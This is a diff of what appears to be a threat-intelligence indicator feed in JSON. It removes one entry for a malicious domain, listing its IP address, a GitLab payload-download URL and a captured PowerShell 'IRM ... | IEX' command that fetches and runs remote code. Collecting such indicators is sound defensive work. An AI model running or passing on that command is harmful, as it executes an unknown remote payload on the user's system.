@@ -7946,25 +7946,5 @@
     ],
     "ReportId": "cmwmti3a11uip0omlvh5hjhr9",
     "ScannedAt": "2026-11-19T00:34:13.487000+00:00"
-  },
-  {
-    "UrlDomain": "amanialnukhtha.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "107.180.116.64"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwms5p8k1uev0omlqz8p9obh",
-    "ScannedAt": "2026-11-18T23:56:35.729000+00:00"
   }
 ]
